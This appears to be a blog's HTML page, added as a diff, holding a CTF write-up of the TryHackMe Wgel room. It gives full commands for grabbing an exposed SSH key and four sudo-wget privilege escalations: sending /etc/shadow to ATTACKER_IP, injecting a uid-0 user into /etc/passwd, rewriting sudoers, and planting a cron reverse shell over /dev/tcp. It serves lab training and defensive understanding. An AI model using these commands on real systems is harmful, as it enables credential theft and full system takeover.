@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Wgel CTF — Alternative Privilege Escalation Vectors &middot; Low Priv Notes
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/ctf/2026/06/11/wgel-ctf-alternative-privesc-vectors/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>Notes, CTF writeups and security research. Focusing on alternative privilege escalation vectors.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+    <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Low Priv Notes</a>
+<br>            
+<small>Exploring alternative exploitation paths</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">Wgel CTF — Alternative Privilege Escalation Vectors</h1>
+  <span class="post-date">11 Jun 2026</span>
+  <h2 id="overview">Overview</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Platform</strong></td>
+      <td>TryHackMe</td>
+    </tr>
+    <tr>
+      <td><strong>Difficulty</strong></td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td><strong>URL</strong></td>
+      <td><a href="https://tryhackme.com/room/wgelctf" target="_blank">https://tryhackme.com/room/wgelctf</a></td>
+    </tr>
+    <tr>
+      <td><strong>Focus</strong></td>
+      <td>Alternative privilege escalation vectors via <code class="language-plaintext highlighter-rouge">sudo wget</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>This is a straightforward room. The goal is to get access to the target machine and escalate privileges to full control. No flags are discussed here — the focus is entirely on the techniques.</p>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Starting with a port scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> &lt;TARGET_IP&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp open  http    Apache httpd 2.4.18
+</code></pre></div></div>
+
+<p>Two services: SSH on port 22 and a web server on port 80. Navigating to <code class="language-plaintext highlighter-rouge">http://&lt;TARGET_IP&gt;</code> shows the default Apache page. Nothing interesting at first glance, but the page source reveals this comment:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Jessie don't forget to udate the webiste --&gt;</span>
+</code></pre></div></div>
+
+<p>A typo and a name — <code class="language-plaintext highlighter-rouge">jessie</code>. Potential username noted.</p>
+
+<hr />
+
+<h2 id="enumeration">Enumeration</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://&lt;TARGET_IP&gt; <span class="nt">--wordlist</span> /usr/share/wordlists/dirb/common.txt
+</code></pre></div></div>
+
+<p>Two results stand out:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;TARGET_IP&gt;/sitemap/.ssh/
+http://&lt;TARGET_IP&gt;/sitemap/.ssh/id_rsa
+</code></pre></div></div>
+
+<p>A <code class="language-plaintext highlighter-rouge">.ssh</code> directory sitting inside the web root, fully indexed and publicly accessible — and inside it, a private RSA key. A single <code class="language-plaintext highlighter-rouge">Options -Indexes</code> directive in the Apache config would have hidden the directory entirely. Proper file placement outside the web root would have made this attack path impossible.</p>
+
+<hr />
+
+<h2 id="initial-access">Initial Access</h2>
+
+<p>Download the key and set the right permissions:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;TARGET_IP&gt;/sitemap/.ssh/id_rsa <span class="nt">-o</span> ~/.ssh/wgel_id_rsa
+<span class="nb">chmod </span>600 ~/.ssh/wgel_id_rsa
+</code></pre></div></div>
+
+<p>Connect via SSH using the username found in the page source:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> ~/.ssh/wgel_id_rsa jessie@&lt;TARGET_IP&gt;
+</code></pre></div></div>
+
+<p>We’re in as <code class="language-plaintext highlighter-rouge">jessie</code>.</p>
+
+<hr />
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>First thing after getting a shell — check what <code class="language-plaintext highlighter-rouge">jessie</code> can run as root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+</code></pre></div></div>
+
+<p>The standard approach most use is reading a privileged file directly, assuming the path is /root/root.txt:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/wget <span class="nt">--post-file</span><span class="o">=</span>/root/root_flag.txt http://&lt;ATTACKER_IP&gt;:4445
+</code></pre></div></div>
+
+<p>That works, but it misses the bigger picture. <code class="language-plaintext highlighter-rouge">wget</code> with root privileges is effectively a read/write primitive over the entire filesystem:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">--post-file=&lt;path&gt;</code> sends any file to a listener we control — <strong>arbitrary read</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">-O &lt;path&gt;</code> writes downloaded content to any path — <strong>arbitrary write</strong></li>
+</ul>
+
+<p>Those two capabilities together open up several paths to root. Below are the ones explored in this room.</p>
+
+<hr />
+
+<h3 id="vector-1----post-file-exfiltration">Vector 1 — <code class="language-plaintext highlighter-rouge">--post-file</code> exfiltration</h3>
+
+<p>This doesn’t give a shell, but it lets you read any file root has access to: <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, SSH keys, configuration files, anything. Useful when the goal is data and not necessarily a shell.</p>
+
+<p>On the attacker, start a listener:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 8000 <span class="o">&gt;</span> output_raw
+</code></pre></div></div>
+
+<p>On the target, send the file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wget <span class="nt">--post-file</span><span class="o">=</span>/etc/shadow http://&lt;ATTACKER_IP&gt;:8000/
+</code></pre></div></div>
+
+<p>The data arrives wrapped in HTTP POST headers. Strip them with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'/^root:/,$p'</span> output_raw <span class="o">&gt;</span> output_clean
+</code></pre></div></div>
+
+<p>Breaking that down: <code class="language-plaintext highlighter-rouge">sed -n</code> suppresses default output; <code class="language-plaintext highlighter-rouge">/^root:/,$p</code> finds the first line starting with <code class="language-plaintext highlighter-rouge">root:</code> and prints from there to the end of the file. Works for both <code class="language-plaintext highlighter-rouge">/etc/shadow</code> and <code class="language-plaintext highlighter-rouge">/etc/passwd</code> since both start with the root entry.</p>
+
+<hr />
+
+<h3 id="vector-2--etcpasswd-overwrite">Vector 2 — <code class="language-plaintext highlighter-rouge">/etc/passwd</code> overwrite</h3>
+
+<p><code class="language-plaintext highlighter-rouge">/etc/passwd</code> uses an <code class="language-plaintext highlighter-rouge">x</code> in the second field to delegate authentication to <code class="language-plaintext highlighter-rouge">/etc/shadow</code>. If that field contains a valid hash instead, the system uses it directly. This means we can inject a new entry with <code class="language-plaintext highlighter-rouge">uid=0</code> and a password we know, then <code class="language-plaintext highlighter-rouge">su</code> into it as root.</p>
+
+<p><strong>Step 1 — Exfiltrate the current <code class="language-plaintext highlighter-rouge">/etc/passwd</code></strong></p>
+
+<p>On the attacker:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 8000 <span class="o">&gt;</span> etcpasswd_raw
+</code></pre></div></div>
+
+<p>On the target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wget <span class="nt">--post-file</span><span class="o">=</span>/etc/passwd http://&lt;ATTACKER_IP&gt;:8000/
+</code></pre></div></div>
+
+<p><strong>Step 2 — Strip the HTTP headers</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'/^root:/,$p'</span> etcpasswd_raw <span class="o">&gt;</span> etcpasswd_clean
+</code></pre></div></div>
+
+<p><strong>Step 3 — Generate a password hash</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-6</span> hacker123
+</code></pre></div></div>
+
+<p>This outputs a SHA-512 hash. Copy the full string for the next step.</p>
+
+<p><strong>Step 4 — Inject a root user entry</strong></p>
+
+<p>Use <strong>single quotes</strong> so the shell doesn’t expand the <code class="language-plaintext highlighter-rouge">$</code> characters in the hash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'hacker:$6$&lt;HASH_GENERATED&gt;:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> etcpasswd_clean
+</code></pre></div></div>
+
+<p>Fields in order: username, password hash, UID, GID, comment, home directory, shell. UID and GID set to <code class="language-plaintext highlighter-rouge">0</code> means root.</p>
+
+<p><strong>Step 5 — Verify before uploading</strong></p>
+
+<p>A corrupted <code class="language-plaintext highlighter-rouge">/etc/passwd</code> can lock everyone out of the system. Always check before overwriting:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail</span> <span class="nt">-5</span> etcpasswd_clean
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+jessie:x:1000:1000:jessie,,,:/home/jessie:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+hacker:$6$&lt;HASH_GENERATED&gt;:0:0:root:/root:/bin/bash
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">jessie</code> is still there and the new entry is at the bottom with the hash intact.</p>
+
+<p><strong>Step 6 — Serve and overwrite</strong></p>
+
+<p>On the attacker:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div></div>
+
+<p>On the target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wget http://&lt;ATTACKER_IP&gt;:8000/etcpasswd_clean <span class="nt">-O</span> /etc/passwd
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">-O</code> flag tells <code class="language-plaintext highlighter-rouge">wget</code> to save the downloaded content to a specific path — overwriting the existing file.</p>
+
+<p><strong>Step 7 — Switch to root</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su - hacker
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password:
+root@CorpOne:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="vector-3--etcsudoers-overwrite">Vector 3 — <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> overwrite</h3>
+
+<p>Same read-modify-write approach, this time targeting <code class="language-plaintext highlighter-rouge">/etc/sudoers</code>. The goal is to add a <code class="language-plaintext highlighter-rouge">NOPASSWD</code> entry for <code class="language-plaintext highlighter-rouge">/bin/bash</code>.</p>
+
+<p><strong>Step 1 — Exfiltrate the current sudoers file</strong></p>
+
+<p>On the attacker:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4545
+</code></pre></div></div>
+
+<p>On the target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/wget <span class="nt">--post-file</span><span class="o">=</span>/etc/sudoers http://&lt;ATTACKER_IP&gt;:4545
+</code></pre></div></div>
+
+<p>Save the received content, stripping the HTTP headers, as a local file named <code class="language-plaintext highlighter-rouge">sudoers</code>.</p>
+
+<p><strong>Step 2 — Add the new entry</strong></p>
+
+<p>Append this line to the file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jessie  ALL=(root) NOPASSWD: /bin/bash
+</code></pre></div></div>
+
+<blockquote>
+  <p>A malformed <code class="language-plaintext highlighter-rouge">sudoers</code> file can break <code class="language-plaintext highlighter-rouge">sudo</code> entirely. Don’t remove any existing lines — just append this one. If in doubt, <code class="language-plaintext highlighter-rouge">visudo -c -f sudoers</code> validates the syntax before deploying.</p>
+</blockquote>
+
+<p><strong>Step 3 — Serve and overwrite</strong></p>
+
+<p>On the attacker:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div></div>
+
+<p>On the target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/wget http://&lt;ATTACKER_IP&gt;:8000/sudoers <span class="nt">-O</span> /etc/sudoers
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/sudoers   100%[============================&gt;]   821  --.-KB/s   in 0s
+</code></pre></div></div>
+
+<p><strong>Step 4 — Get a root shell</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /bin/bash
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="vector-4--cron-injection-via-etccrond">Vector 4 — Cron injection via <code class="language-plaintext highlighter-rouge">/etc/cron.d/</code></h3>
+
+<p><code class="language-plaintext highlighter-rouge">wget</code> can write to <code class="language-plaintext highlighter-rouge">/etc/cron.d/</code>, the directory where root picks up and runs scheduled jobs. Drop a crafted file there and get a reverse shell as root within 60 seconds.</p>
+
+<p><strong>Step 1 — Create the malicious cron file</strong></p>
+
+<p>Working from <code class="language-plaintext highlighter-rouge">/tmp</code> on the attacker:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&gt;</span> /tmp/pwned_cron <span class="o">&lt;&lt;</span> <span class="sh">'</span><span class="no">EOF</span><span class="sh">'
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+* * * * * root bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0&gt;&amp;1
+</span><span class="no">
+EOF
+</span></code></pre></div></div>
+
+<p>Three things are required for the job to actually run:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">SHELL=/bin/bash</code> — without this, the <code class="language-plaintext highlighter-rouge">&gt;&amp;</code> operator won’t be interpreted</li>
+  <li><code class="language-plaintext highlighter-rouge">PATH=...</code> — without a defined PATH, the system won’t find the binaries</li>
+  <li>A <strong>blank line at the end</strong> — hard requirement for files in <code class="language-plaintext highlighter-rouge">/etc/cron.d/</code></li>
+</ul>
+
+<p><strong>Step 2 — Verify the file format</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="nt">-A</span> /tmp/pwned_cron
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHELL=/bin/bash$
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin$
+* * * * * root bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0&gt;&amp;1$
+$
+</code></pre></div></div>
+
+<p>Every line ends with <code class="language-plaintext highlighter-rouge">$</code>, including the final blank one. If it’s missing:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="o">&gt;&gt;</span> /tmp/pwned_cron
+</code></pre></div></div>
+
+<p><strong>Step 3 — Start the listener and serve the file</strong></p>
+
+<p>In one terminal:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+
+<p>In another:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div></div>
+
+<p><strong>Step 4 — Drop the cron file on the target</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wget http://&lt;ATTACKER_IP&gt;:8000/pwned_cron <span class="nt">-O</span> /etc/cron.d/pwned
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/cron.d/pwned   100%[============================&gt;]   143  --.-KB/s   in 0s
+</code></pre></div></div>
+
+<p>Wait up to 60 seconds. When cron fires the job, the listener catches the connection:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 34096
+bash: no job control in this shell
+root@CorpOne:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="attack-flow">Attack Flow</h2>
+
+<div class="mermaid">
+graph TD
+    A["nmap scan"] --&gt; B["Port 80\nApache default page"]
+    B --&gt; C["HTML source comment\nusername: jessie"]
+    B --&gt; D["gobuster\nweb enumeration"]
+    D --&gt; E["Indexed .ssh directory\n/sitemap/.ssh/id rsa"]
+    C --&gt; F["SSH access\njessie - private key"]
+    E --&gt; F
+    F --&gt; G["sudo -l\nNOPASSWD: /usr/bin/wget"]
+    G --&gt; V1["Vector 1\n--post-file\narbitrary file read"]
+    G --&gt; V2["Vector 2\n/etc/passwd overwrite\nnew uid=0 user"]
+    G --&gt; V3["Vector 3\n/etc/sudoers overwrite\nNOPASSWD: /bin/bash"]
+    G --&gt; V4["Vector 4\ncron job injection\nreverse shell"]
+    V2 --&gt; R["root"]
+    V3 --&gt; R
+    V4 --&gt; R
+</div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<p><code class="language-plaintext highlighter-rouge">sudo</code> permissions over tools like <code class="language-plaintext highlighter-rouge">wget</code>, <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">cp</code>, or <code class="language-plaintext highlighter-rouge">tee</code> are far more dangerous than they appear. Read/write access to the filesystem as root is, for all practical purposes, equivalent to having root itself. If you ever see one of these in a <code class="language-plaintext highlighter-rouge">sudo -l</code> output, check <a href="https://gtfobins.github.io">GTFOBins</a> — it covers exactly what you can do with each one.</p>
+
+<p>The exposed private key is a good reminder that web server configuration matters as much as application security. Directory listing enabled on a <code class="language-plaintext highlighter-rouge">.ssh</code> folder inside the web root is the kind of misconfiguration that ends a pentest before it really begins.</p>
+
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/ctf/web/2026/07/10/blog/">
+            Blog
+            <small>10 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/ctf/2026/07/08/watcher/">
+            Watcher
+            <small>08 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/websec/2026/07/07/username-enumeration-timing/">
+            Username Enumeration via Response Timing
+            <small>07 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script src='/public/js/script.js'></script>
+  </body>
+</html>
